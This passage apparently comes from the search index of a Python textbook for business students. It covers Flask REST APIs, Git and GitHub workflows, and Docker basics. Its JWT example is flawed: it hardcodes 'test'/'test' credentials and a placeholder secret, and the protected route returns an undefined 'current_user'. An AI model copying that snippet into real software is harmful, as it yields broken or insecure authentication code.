    "text": "23.7 Handling Data with Flask\n\n23.7.1 Using Flask-SQLAlchemy\nFlask-SQLAlchemy simplifies the integration between Flask and SQLAlchemy, an ORM library for Python.\n\nInstall Flask-SQLAlchemy:\npip install Flask-SQLAlchemy\nSet up SQLAlchemy in your Flask application:\nfrom flask import Flask, request, jsonify\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'\ndb = SQLAlchemy(app)\n\nclass Item(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(80), nullable=False)\n\ndb.create_all()\n\n@app.route('/items', methods=['GET'])\ndef get_items():\n    items = Item.query.all()\n    return jsonify([{\"id\": item.id, \"name\": item.name} for item in items])\n\n# Other routes here...\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\n\n\n23.7.2 Using Marshmallow for Serialization\nMarshmallow is an object serialization/deserialization library.\n\nInstall Marshmallow and Flask-Marshmallow:\npip install marshmallow flask-marshmallow\nSet up Marshmallow in your Flask application:\nfrom flask_marshmallow import Marshmallow\n\nma = Marshmallow(app)\n\nclass ItemSchema(ma.SQLAlchemyAutoSchema):\n    class Meta:\n        model = Item\n\nitem_schema = ItemSchema()\nitems_schema = ItemSchema(many=True)\n\n@app.route('/items', methods=['GET'])\ndef get_items():\n    items = Item.query.all()\n    return items_schema.jsonify(items)",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#error-handling",
    "href": "18_modern_network_practices.html#error-handling",
    "title": "19  Modern Network Practices with Python",
    "section": "23.8 Error Handling",
    "text": "23.8 Error Handling\nTo handle errors gracefully, Flask provides an error handler decorator.\n@app.errorhandler(404)\ndef resource_not_found(e):\n    return jsonify(error=str(e)), 404\n\n@app.errorhandler(400)\ndef bad_request(e):\n    return jsonify(error=str(e)), 400",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#testing-your-api",
    "href": "18_modern_network_practices.html#testing-your-api",
    "title": "19  Modern Network Practices with Python",
    "section": "23.9 Testing Your API",
    "text": "23.9 Testing Your API\nUse the unittest module to write tests for your API.\n\nInstall Flask-Testing:\npip install Flask-Testing\nCreate a test file test_app.py:\nimport unittest\nfrom app import app, db, Item\n\nclass BasicTests(unittest.TestCase):\n\n    def setUp(self):\n        app.config['TESTING'] = True\n        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'\n        self.app = app.test_client()\n        db.create_all()\n\n    def tearDown(self):\n        db.session.remove()\n        db.drop_all()\n\n    def test_items(self):\n        response = self.app.get('/items')\n        self.assertEqual(response.status_code, 200)\n\nif __name__ == \"__main__\":\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#authentication-and-authorization",
    "href": "18_modern_network_practices.html#authentication-and-authorization",
    "title": "19  Modern Network Practices with Python",
    "section": "23.10 Authentication and Authorization",
    "text": "23.10 Authentication and Authorization\nFlask-JWT-Extended is a popular extension for adding JSON Web Tokens (JWT) to your Flask application.\n\nInstall Flask-JWT-Extended:\npip install Flask-JWT-Extended\nSet up JWT in your application:\nfrom flask_jwt_extended import JWTManager, create_access_token, jwt_required\n\napp.config['JWT_SECRET_KEY'] = 'your_jwt_secret_key'\njwt = JWTManager(app)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.json.get('username', None)\n    password = request.json.get('password', None)\n    if username != 'test' or password != 'test':\n        return jsonify({\"msg\": \"Bad username or password\"}), 401\n    access_token = create_access_token(identity=username)\n    return jsonify(access_token=access_token)\n\n@app.route('/protected', methods=['GET'])\n@jwt_required()\ndef protected():\n    return jsonify(logged_in_as=current_user), 200",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#best-practices",
    "href": "18_modern_network_practices.html#best-practices",
    "title": "19  Modern Network Practices with Python",
    "section": "23.11 Best Practices",
    "text": "23.11 Best Practices\n\nUse Blueprints for Modular Code: Blueprints help organize your application into modules.\nUse Environment Variables for Configuration: Keep secrets and configuration out of your codebase.\nEnable Logging: Set up logging to track errors and important events.\nWrite Tests: Ensure your code works as expected by writing unit tests.\nDocumentation: Use tools like Swagger or Postman to document your API.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#conclusion-4",
    "href": "18_modern_network_practices.html#conclusion-4",
    "title": "19  Modern Network Practices with Python",
    "section": "23.12 Conclusion",
    "text": "23.12 Conclusion\nThis tutorial has covered the essentials of developing RESTful APIs using Flask. We’ve gone through setting up Flask, creating endpoints, handling data, testing, and adding authentication. With this knowledge, you can build scalable and maintainable APIs.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "summary.html",
    "href": "summary.html",
    "title": "20  Summary",
    "section": "",
    "text": "As we conclude “Python for Business Analytics and Information Systems,” it is my hope that this book has served as a comprehensive and enlightening guide into the powerful role Python plays in the field of business technology. From initial setup and basic programming constructs to advanced system design and network management, the journey through the chapters was designed to not only teach Python but also show its extensive applications in real-world business scenarios.\n\n20.0.1 Key Takeaways\n\nPython Fundamentals: We began with the basics—installing Python and setting up the environment, then moved on to Python syntax, control structures, functions, and modules. These foundations are crucial for anyone aspiring to build robust applications in Python.\nAdvanced Python: The deeper exploration into object-oriented programming, error handling, debugging, and data handling equipped you with the skills to write efficient and effective Python code. These skills are vital for developing sophisticated systems and ensuring their reliability and scalability.\nBusiness Applications: We discussed how Python interacts with databases, APIs, and automates system tasks, which are essential components in systems analysis and design. Understanding these interactions allows for the creation of seamless and efficient business processes.\nSystem Design and Network Communications: The detailed discussion on system design using Python and its role in business data communication, including network architecture and protocols, highlighted Python’s versatility and its importance in maintaining and enhancing business operations.\nVersion Control: Finally, the appendix on version control underscored the importance of using tools like Git to manage changes and collaborate in professional environments, a critical skill for any modern programmer.\n\n\n\n20.0.2 Continuing Your Python Journey\nWhile this book provides a solid foundation and broad coverage of Python’s applications in business analytics and information systems, learning in technology is an ever-evolving process. I encourage you to continue exploring Python’s vast ecosystem and its emerging tools and libraries. Participate in forums, contribute to open source projects, and keep updating your skills with the latest developments in the field.\n\n\n20.0.3 Applying Your Knowledge\nPractical application of knowledge is key to mastery. I recommend applying the concepts learned in this book through internships, project collaborations, and real-world problem-solving. This hands-on experience will solidify your understanding and enhance your capability to innovate and adapt in the fast-paced world of business technology.\n\n\n20.0.4 Final Thoughts\n“Python for Business Analytics and Information Systems” was written with the ambition of making Python accessible and useful for students and professionals in business technology. As you close this book, remember that your journey with Python is just beginning. The skills you have acquired are the tools with which you will carve out your path in the business world, driving innovation, efficiency, and success.\nThank you for choosing this book as your guide. Here’s to your continued success in your educational and professional endeavors in business analytics and information systems!",
    "crumbs": [
      "<span class='chapter-number'>20</span>  <span class='chapter-title'>Summary</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html",
    "href": "A1_version_control.html",
    "title": "21  Introduction to Version Control",
    "section": "",
    "text": "21.0.1 What is Version Control?\nVersion control is a system that records changes to a file or set of files over time so that you can recall specific versions later. It helps in: - Tracking Changes: Keeps a history of changes made to the project. - Collaboration: Allows multiple people to work on a project simultaneously. - Backup: Provides a safety net against losing work.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#introduction-to-github",
    "href": "A1_version_control.html#introduction-to-github",
    "title": "21  Introduction to Version Control",
    "section": "21.1 Introduction to GitHub",
    "text": "21.1 Introduction to GitHub\nGitHub is a web-based platform that uses Git for version control and provides a collaborative environment for developers to work on projects. This tutorial will guide you through the basics of using GitHub, from setting up an account to managing repositories and collaborating with others.\n\n21.1.1 Setting Up GitHub\n\n21.1.1.1 Creating an Account\n\nGo to GitHub.\nClick on “Sign up” and follow the instructions to create your account.\n\n\n\n21.1.1.2 Setting Up Git\nBefore using GitHub, ensure that Git is installed and configured on your local machine. If not, refer to the Git tutorial for installation instructions.\n\n\n\n21.1.2 Basic GitHub Workflow\n\nCreate a Repository: A repository (or repo) is a storage space where your project lives.\nClone the Repository: Download a copy of the repository to your local machine.\nMake Changes: Edit, add, or delete files in your project.\nCommit Changes: Save snapshots of your project’s history.\nPush Changes: Upload your changes to GitHub.\nCollaborate: Work with others using branches, pull requests, and issues.\n\n\n\n21.1.3 Creating a Repository\n\nLog in to your GitHub account.\nClick on the “+” icon in the upper-right corner and select “New repository”.\nFill in the repository name, description (optional), and choose whether it will be public or private.\nClick “Create repository”.\n\n\n\n21.1.4 Cloning a Repository\nTo work on a repository locally, clone it to your machine:\ngit clone https://github.com/your-username/your-repository.git\n\n\n21.1.5 Making Changes\nNavigate to the repository directory:\ncd your-repository\nEdit files as needed using your preferred text editor or IDE.\n\n\n21.1.6 Committing Changes\nAfter making changes, add and commit them:\ngit add .\ngit commit -m \"Describe your changes\"\n\n\n21.1.7 Pushing Changes\nUpload your changes to GitHub:\ngit push origin main\nReplace main with your branch name if you are working on a different branch.\n\n\n21.1.8 Collaborating with GitHub\n\n21.1.8.1 Branches\nBranches allow multiple people to work on a project simultaneously without interfering with each other’s work.\n\nCreate a branch:\n\ngit checkout -b feature-branch\n\nSwitch to a branch:\n\ngit checkout feature-branch\n\n\n21.1.8.2 Pull Requests\nPull requests are a way to propose changes to a repository and have them reviewed before merging.\n\nPush your branch to GitHub:\n\ngit push origin feature-branch\n\nGo to the GitHub repository and click “Compare & pull request”.\nReview your changes, add a descriptive message, and click “Create pull request”.\n\n\n\n21.1.8.3 Merging Pull Requests\nAfter a pull request is reviewed and approved, it can be merged:\n\nGo to the pull request on GitHub.\nClick “Merge pull request”.\nConfirm the merge.\n\n\n\n21.1.8.4 Issues\nIssues are used to track bugs, enhancements, or other tasks related to the project.\n\nGo to the “Issues” tab in your repository.\nClick “New issue”.\nFill in the title and description, then click “Submit new issue”.\n\n\n\n\n21.1.9 Best Practices\n\nCommit Often: Regular commits with clear messages help track changes and make collaboration easier.\nUse Branches: Separate new features, bug fixes, and experiments into branches.\nReview Code: Use pull requests for code reviews before merging changes.\nWrite Descriptive Messages: Clear commit messages and pull request descriptions help others understand your changes.\nDocument Your Project: Use README files and GitHub Wiki to document your project and its usage.\n\n\n\n21.1.10 Conclusion\nGitHub is a powerful platform for version control and collaboration. By mastering GitHub’s features and following best practices, you can manage your projects more efficiently and work effectively with others. Start exploring GitHub, create repositories, and collaborate on exciting projects!",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#table-of-contents",
    "href": "A1_version_control.html#table-of-contents",
    "title": "21  Introduction to Version Control",
    "section": "22.1 Table of Contents",
    "text": "22.1 Table of Contents\n\nIntroduction to Git\nInstalling Git\nSetting Up Git\nCreating a New Repository\nBasic Git Workflow\n\nStaging and Committing Changes\nViewing Commit History\nUndoing Changes\n\nBranching and Merging\n\nCreating and Switching Branches\nMerging Branches\nResolving Conflicts\n\nWorking with Remote Repositories\n\nAdding a Remote\nPushing to a Remote Repository\nPulling from a Remote Repository\nCloning a Repository\n\nAdvanced Git Operations\n\nStashing Changes\nRebasing\nTagging\n\nGit Configuration and Customization\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#introduction-to-git",
    "href": "A1_version_control.html#introduction-to-git",
    "title": "21  Introduction to Version Control",
    "section": "22.2 Introduction to Git",
    "text": "22.2 Introduction to Git\nGit is a distributed version control system that helps developers keep track of changes in their code. It is especially useful for collaborating on projects, maintaining different versions of a project, and reverting to previous states when necessary.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#installing-git",
    "href": "A1_version_control.html#installing-git",
    "title": "21  Introduction to Version Control",
    "section": "22.3 Installing Git",
    "text": "22.3 Installing Git\n\n22.3.1 Windows\n\nDownload the installer from git-scm.com.\nRun the installer and follow the setup wizard.\n\n\n\n22.3.2 macOS\nYou can install Git using Homebrew:\nbrew install git\nAlternatively, you can download the installer from git-scm.com.\n\n\n22.3.3 Linux\nOn Debian-based distributions (like Ubuntu):\nsudo apt update\nsudo apt install git\nOn Red Hat-based distributions (like Fedora):\nsudo dnf install git",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#setting-up-git-2",
    "href": "A1_version_control.html#setting-up-git-2",
    "title": "21  Introduction to Version Control",
    "section": "22.4 Setting Up Git",
    "text": "22.4 Setting Up Git\nAfter installing Git, configure it with your personal information:\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"your.email@example.com\"\nTo verify your configuration:\ngit config --list",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#creating-a-new-repository",
    "href": "A1_version_control.html#creating-a-new-repository",
    "title": "21  Introduction to Version Control",
    "section": "22.5 Creating a New Repository",
    "text": "22.5 Creating a New Repository\nNavigate to your project directory and initialize a new Git repository:\nmkdir my_python_project\ncd my_python_project\ngit init",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#basic-git-workflow",
    "href": "A1_version_control.html#basic-git-workflow",
    "title": "21  Introduction to Version Control",
    "section": "22.6 Basic Git Workflow",
    "text": "22.6 Basic Git Workflow\n\n22.6.1 Staging and Committing Changes\n\nCreate a Python file:\n# my_script.py\nprint(\"Hello, World!\")\nStage the file:\ngit add my_script.py\nCommit the changes:\ngit commit -m \"Add initial version of my_script.py\"\n\n\n\n22.6.2 Viewing Commit History\nTo view the commit history:\ngit log\nFor a compact view:\ngit log --oneline\n\n\n22.6.3 Undoing Changes\n\nUnstage a file:\ngit reset my_script.py\nDiscard changes in a file:\ngit checkout -- my_script.py\nRevert to a previous commit:\ngit revert &lt;commit-hash&gt;",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#branching-and-merging",
    "href": "A1_version_control.html#branching-and-merging",
    "title": "21  Introduction to Version Control",
    "section": "22.7 Branching and Merging",
    "text": "22.7 Branching and Merging\n\n22.7.1 Creating and Switching Branches\n\nCreate a new branch:\ngit branch feature-branch\nSwitch to the new branch:\ngit checkout feature-branch\n\n\n\n22.7.2 Merging Branches\n\nSwitch to the main branch:\ngit checkout main\nMerge the feature branch:\ngit merge feature-branch\n\n\n\n22.7.3 Resolving Conflicts\nWhen merging branches, you might encounter conflicts. Open the files with conflicts, resolve them, then stage and commit the resolved files.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#working-with-remote-repositories",
    "href": "A1_version_control.html#working-with-remote-repositories",
    "title": "21  Introduction to Version Control",
    "section": "22.8 Working with Remote Repositories",
    "text": "22.8 Working with Remote Repositories\n\n22.8.1 Adding a Remote\nTo add a remote repository:\ngit remote add origin &lt;remote-url&gt;\n\n\n22.8.2 Pushing to a Remote Repository\nTo push changes to a remote repository:\ngit push origin main\n\n\n22.8.3 Pulling from a Remote Repository\nTo pull changes from a remote repository:\ngit pull origin main\n\n\n22.8.4 Cloning a Repository\nTo clone a remote repository:\ngit clone &lt;repository-url&gt;",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#advanced-git-operations",
    "href": "A1_version_control.html#advanced-git-operations",
    "title": "21  Introduction to Version Control",
    "section": "22.9 Advanced Git Operations",
    "text": "22.9 Advanced Git Operations\n\n22.9.1 Stashing Changes\nTo save your changes without committing them:\ngit stash\nTo apply stashed changes:\ngit stash apply\n\n\n22.9.2 Rebasing\nTo reapply commits on top of another base tip:\n\nSwitch to the branch you want to rebase:\ngit checkout feature-branch\nRebase onto another branch:\ngit rebase main\n\n\n\n22.9.3 Tagging\nTo create a tag:\ngit tag v1.0\nTo push tags to a remote repository:\ngit push --tags",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#full-length-python-project-example",
    "href": "A1_version_control.html#full-length-python-project-example",
    "title": "21  Introduction to Version Control",
    "section": "22.10 Full-Length Python Project Example",
    "text": "22.10 Full-Length Python Project Example\nLet’s create a simple Python project to demonstrate a more comprehensive Git workflow.\n\n22.10.1 Step 1: Create the Project Structure\nmkdir my_python_project\ncd my_python_project\nmkdir src tests\ntouch src/__init__.py tests/__init__.py\n\n\n22.10.2 Step 2: Initialize Git Repository\ngit init\n\n\n22.10.3 Step 3: Create the Main Application\nCreate a simple Python script src/app.py:\n# src/app.py\ndef greet(name):\n    return f\"Hello, {name}!\"\n\nif __name__ == \"__main__\":\n    print(greet(\"World\"))\n\n\n22.10.4 Step 4: Create a Test\nCreate a test file tests/test_app.py:\n# tests/test_app.py\nimport unittest\nfrom src.app import greet\n\nclass TestApp(unittest.TestCase):\n    def test_greet(self):\n        self.assertEqual(greet(\"World\"), \"Hello, World!\")\n\nif __name__ == \"__main__\":\n    unittest.main()\n\n\n22.10.5 Step 5: Stage and Commit Changes\ngit add src/app.py tests/test_app.py\ngit commit -m \"Add main application and test\"\n\n\n22.10.6 Step 6: Create a Feature Branch\ngit checkout -b feature-add-logging\n\n\n22.10.7 Step 7: Implement a New Feature\nModify src/app.py to add logging:\n# src/app.py\nimport logging\n\nlogging.basicConfig(level=logging.INFO)\n\ndef greet(name):\n    greeting = f\"Hello, {name}!\"\n    logging.info(greeting)\n    return greeting\n\nif __name__ == \"__main__\":\n    print(greet(\"World\"))\n\n\n22.10.8 Step 8: Stage and Commit Changes\ngit add src/app.py\ngit commit -m \"Add logging to greet function\"\n\n\n22.10.9 Step 9: Merge Feature Branch\n\nSwitch to the main branch:\ngit checkout main\nMerge the feature branch:\ngit merge feature-add-logging\n\n\n\n22.10.10 Step 10: Push to Remote Repository\ngit push origin main",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#git-configuration-and-customization",
    "href": "A1_version_control.html#git-configuration-and-customization",
    "title": "21  Introduction to Version Control",
    "section": "22.11 Git Configuration and Customization",
    "text": "22.11 Git Configuration and Customization\nYou can customize Git using configuration files. For example, to set up aliases:\ngit config --global alias.co checkout\ngit config --global alias.br branch\ngit config --global alias.ci commit\ngit config --global alias.st status",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#best-practices-2",
    "href": "A1_version_control.html#best-practices-2",
    "title": "21  Introduction to Version Control",
    "section": "22.12 Best Practices",
    "text": "22.12 Best Practices\n\nCommit often: Regular commits make it easier to track changes and revert if needed.\nUse meaningful commit messages: Write clear, descriptive commit messages.\nKeep branches short-lived: Merge branches back into the main branch regularly.\nRegularly pull changes: Keep your local repository up-to-date with the remote repository.\nReview diffs before committing: Check what changes you’re committing.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#conclusion-2",
    "href": "A1_version_control.html#conclusion-2",
    "title": "21  Introduction to Version Control",
    "section": "22.13 Conclusion",
    "text": "22.13 Conclusion\nThis deep dive tutorial covered the essential aspects of using Git on a local machine, including a full-length Python project example. By mastering these concepts, you can effectively manage your codebase and collaborate with others.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#table-of-contents-1",
    "href": "A1_version_control.html#table-of-contents-1",
    "title": "21  Introduction to Version Control",
    "section": "23.1 Table of Contents",
    "text": "23.1 Table of Contents\n\nPrerequisites\nSetting Up the Python Project\nInitializing a Local Git Repository\nCreating a Remote GitHub Repository from the Command Line\nLinking Local Repository to Remote Repository\nPushing Local Repository to GitHub\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#prerequisites",
    "href": "A1_version_control.html#prerequisites",
    "title": "21  Introduction to Version Control",
    "section": "23.2 Prerequisites",
    "text": "23.2 Prerequisites\nBefore you start, ensure you have the following installed and set up:\n\nGit: Download and install from git-scm.com.\nGitHub Account: Create an account on GitHub.\nGitHub CLI (gh): Install the GitHub CLI from cli.github.com.\n\nYou can install the GitHub CLI using Homebrew on macOS:\nbrew install gh\nOr on Windows using the installer from the GitHub CLI website, or using Scoop:\nscoop install gh\nFor Linux, follow the instructions on the GitHub CLI website.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#setting-up-the-python-project",
    "href": "A1_version_control.html#setting-up-the-python-project",
    "title": "21  Introduction to Version Control",
    "section": "23.3 Setting Up the Python Project",
    "text": "23.3 Setting Up the Python Project\nFirst, create a new directory for your Python project and set up a basic structure.\nmkdir my_python_project\ncd my_python_project\nmkdir src tests\ntouch src/__init__.py tests/__init__.py\nCreate a simple Python script src/app.py:\n# src/app.py\ndef greet(name):\n    return f\"Hello, {name}!\"\n\nif __name__ == \"__main__\":\n    print(greet(\"World\"))\nCreate a test file tests/test_app.py:\n# tests/test_app.py\nimport unittest\nfrom src.app import greet\n\nclass TestApp(unittest.TestCase):\n    def test_greet(self):\n        self.assertEqual(greet(\"World\"), \"Hello, World!\")\n\nif __name__ == \"__main__\":\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#initializing-a-local-git-repository",
    "href": "A1_version_control.html#initializing-a-local-git-repository",
    "title": "21  Introduction to Version Control",
    "section": "23.4 Initializing a Local Git Repository",
    "text": "23.4 Initializing a Local Git Repository\nNavigate to your project directory and initialize a new Git repository:\ncd my_python_project\ngit init\nAdd the project files to the repository:\ngit add .\nCommit the files:\ngit commit -m \"Initial commit\"",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#creating-a-remote-github-repository-from-the-command-line",
    "href": "A1_version_control.html#creating-a-remote-github-repository-from-the-command-line",
    "title": "21  Introduction to Version Control",
    "section": "23.5 Creating a Remote GitHub Repository from the Command Line",
    "text": "23.5 Creating a Remote GitHub Repository from the Command Line\nUse the GitHub CLI to create a new repository on GitHub. First, authenticate with GitHub:\ngh auth login\nFollow the prompts to log in and authenticate.\nNext, create the GitHub repository:\ngh repo create my_python_project --public --source=. --remote=origin\nExplanation of the flags: - --public: Makes the repository public. Use --private if you want a private repository. - --source=.: Specifies the current directory as the source. - --remote=origin: Sets the remote name to origin.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#linking-local-repository-to-remote-repository",
    "href": "A1_version_control.html#linking-local-repository-to-remote-repository",
    "title": "21  Introduction to Version Control",
    "section": "23.6 Linking Local Repository to Remote Repository",
    "text": "23.6 Linking Local Repository to Remote Repository\nThis step is automatically handled by the gh repo create command with the --remote=origin flag. However, if you need to do it manually, you can add the remote URL to your local Git repository using:\ngit remote add origin https://github.com/your_username/my_python_project.git",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#pushing-local-repository-to-github",
    "href": "A1_version_control.html#pushing-local-repository-to-github",
    "title": "21  Introduction to Version Control",
    "section": "23.7 Pushing Local Repository to GitHub",
    "text": "23.7 Pushing Local Repository to GitHub\nPush the local repository to GitHub:\ngit push -u origin main\nThis command pushes the local main branch to the origin remote and sets up tracking, so future git push commands will know where to push changes.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A1_version_control.html#conclusion-3",
    "href": "A1_version_control.html#conclusion-3",
    "title": "21  Introduction to Version Control",
    "section": "23.8 Conclusion",
    "text": "23.8 Conclusion\nCongratulations! You’ve successfully created a GitHub repository from the command line and pushed a Python project to it. Here’s a summary of the steps:\n\nSet up your Python project.\nInitialize a local Git repository.\nUse the GitHub CLI to create a remote repository on GitHub.\nLink the local repository to the remote repository.\nPush the local repository to GitHub.\n\nBy mastering these steps, you can efficiently manage your projects and collaborate with others using Git and GitHub.",
    "crumbs": [
      "<span class='chapter-number'>21</span>  <span class='chapter-title'>Introduction to Version Control</span>"
    ]
  },
  {
    "objectID": "A2_docker.html",
    "href": "A2_docker.html",
    "title": "22  Using Docker",
    "section": "",
    "text": "22.1 Introduction to Docker with Python\nDocker is a powerful platform that allows you to create, deploy, and run applications in isolated containers. Containers are lightweight, portable, and ensure that your application runs consistently regardless of the environment. This tutorial will introduce you to Docker, demonstrate how to containerize a Python application, and manage Docker containers.",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#introduction-to-docker-with-python",
    "href": "A2_docker.html#introduction-to-docker-with-python",
    "title": "22  Using Docker",
    "section": "",
    "text": "22.1.1 Installing Docker\nFirst, you need to install Docker. You can download and install Docker from the official Docker website.\n\n\n22.1.2 Docker Basics\n\n22.1.2.1 Key Concepts\n\nImage: A lightweight, standalone, executable package that includes everything needed to run a piece of software, including the code, runtime, libraries, and dependencies.\nContainer: A runnable instance of an image. You can create, start, stop, move, and delete a container using the Docker API or CLI.\nDockerfile: A text file that contains a series of instructions on how to build a Docker image.\n\n\n\n\n22.1.3 Containerizing a Python Application\nLet’s create a simple Python application and containerize it using Docker.\n\n22.1.3.1 Step 1: Create a Simple Python Application\nCreate a directory for your project and add a Python script:\nmkdir docker-python-app\ncd docker-python-app\nCreate a file named app.py with the following content:\n# app.py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, Docker!'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\nCreate a requirements.txt file with the following content:\nflask\n\n\n22.1.3.2 Step 2: Create a Dockerfile\nCreate a file named Dockerfile in the project directory with the following content:\n# Use the official Python image from the Docker Hub\nFROM python:3.9-slim\n\n# Set the working directory in the container\nWORKDIR /app\n\n# Copy the current directory contents into the container at /app\nCOPY . /app\n\n# Install the required packages\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Make port 5000 available to the world outside this container\nEXPOSE 5000\n\n# Define the command to run the application\nCMD [\"python\", \"app.py\"]\n\n\n22.1.3.3 Step 3: Build the Docker Image\nOpen a terminal, navigate to your project directory, and run the following command to build the Docker image:\ndocker build -t docker-python-app .\n\n\n22.1.3.4 Step 4: Run the Docker Container\nRun the following command to start a container from the image you built:\ndocker run -d -p 5000:5000 docker-python-app\nThis command runs the container in detached mode (-d) and maps port 5000 on your host to port 5000 in the container (-p 5000:5000).\n\n\n22.1.3.5 Step 5: Test the Application\nOpen a web browser and go to http://localhost:5000. You should see the message “Hello, Docker!”.\n\n\n\n22.1.4 Managing Docker Containers\n\n22.1.4.1 List Running Containers\nTo list all running containers, use the following command:\ndocker ps\n\n\n22.1.4.2 Stop a Container\nTo stop a running container, use the docker stop command followed by the container ID or name:\ndocker stop &lt;container_id&gt;\n\n\n22.1.4.3 Remove a Container\nTo remove a container, use the docker rm command followed by the container ID or name:\ndocker rm &lt;container_id&gt;\n\n\n\n22.1.5 Docker Compose\nDocker Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration.\n\n22.1.5.1 Step 1: Create a docker-compose.yml File\nCreate a file named docker-compose.yml in your project directory with the following content:\nversion: '3'\nservices:\n  web:\n    build: .\n    ports:\n      - \"5000:5000\"\n\n\n22.1.5.2 Step 2: Run Docker Compose\nRun the following command to start the application:\ndocker-compose up\nThis command builds the image (if it hasn’t been built already) and starts the services defined in the docker-compose.yml file.\n\n\n22.1.5.3 Step 3: Stop Docker Compose\nTo stop the application, run:\ndocker-compose down\n\n\n\n22.1.6 Conclusion\nDocker simplifies the process of developing, shipping, and running applications by using containerization. By containerizing your Python application, you ensure it runs consistently across different environments. Docker Compose further simplifies managing multi-container applications. Mastering Docker can greatly enhance your development workflow, making your applications more portable, scalable, and easier to manage. ## Introduction to Docker with Python\nDocker is a powerful platform that allows you to create, deploy, and run applications in isolated containers. Containers are lightweight, portable, and ensure that your application runs consistently regardless of the environment. This tutorial will introduce you to Docker, demonstrate how to containerize a Python application, and manage Docker containers.\n\n\n22.1.7 Installing Docker\nFirst, you need to install Docker. You can download and install Docker from the official Docker website.\n\n\n22.1.8 Docker Basics\n\n22.1.8.1 Key 